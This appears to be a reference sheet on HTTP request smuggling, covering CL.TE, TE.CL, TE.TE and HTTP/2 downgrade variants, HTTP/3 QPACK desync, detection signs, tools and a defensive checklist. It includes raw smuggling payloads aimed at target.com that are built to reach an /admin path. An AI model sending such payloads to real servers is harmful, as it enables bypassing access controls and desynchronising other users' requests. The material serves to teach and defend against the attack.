# HTTP Request Smuggling: 2026 Complete Reference

## Attack Classes

### CL.TE (Content-Length vs Transfer-Encoding)
```
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
```
Front-end uses Content-Length, back-end uses Transfer-Encoding. Second request smuggled.

### TE.CL
```
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
POST /404 HTTP/1.1
Content-Length: 15

x=1
0

```
Front-end uses Transfer-Encoding, back-end uses Content-Length. First request body truncated.

### TE.TE (Obfuscated TE)
```http
Transfer-Encoding: chunked
Transfer-encoding: xchunked
Transfer-Encoding:[tab]chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding : chunked
Transfer-Encoding:
chunked
```

## HTTP/2 Downgrade Smuggling (H2.CL / H2.TE)

HTTP/2 uses binary framing (no headers for length). When reverse proxy downgrades H2 to H1 for backend:
```
:method POST
:path /
:authority target.com
content-type application/x-www-form-urlencoded
content-length 0

POST /admin HTTP/1.1
Host: target.com
Content-Length: 10

x=1
```
Front-end processes as single H2 stream. Back-end receives H1 with two requests (smuggled).

## HTTP/3 Desync

### QPACK Encoding Confusion
- H3 uses QPACK for header compression
- QPACK dynamic table desynchronization when upstream and downstream disagree on table state
- Smuggled headers when table insertion count mismatches
- Reported by James Kettle (PortSwigger) in 2024-2025 research

## Detection

### Timing-Based
- Send smuggling payload → subsequent request returns 404 or 400
- 404 = smuggled prefix consumed your real request
- Timing can indicate smuggling vs normal processing

### Response-Based
- Smuggled request content appears in next response
- Different status codes on identical follow-up requests
- Multiple responses from single request

## Tooling
- **HTTP Request Smuggler** (Burp extension, PortSwigger): Automated scanning for all types
- **Smuggler**: CL.TE/TE.CL detection
- **h2smuggler**: HTTP/2 downgrade detection
- **smuggler.py** (defparam): CL.TE/TE.CL/TE.TE detection

## Defensive Checklist
1. Use HTTP/2 end-to-end (no H2→H1 downgrade)
2. Reject ambiguous requests: reject Transfer-Encoding when Content-Length present
3. Normalize Transfer-Encoding to single value
4. Rewrite protocol: normalize malformed headers upstream
5. Use precise Content-Length from actual body
6. Close connection on ambiguous requests
7. Upgrade to newest reverse proxy versions (nginx, haproxy, envoy)
8. For H3: ensure QPACK decoder state is synchronized across front-end and back-end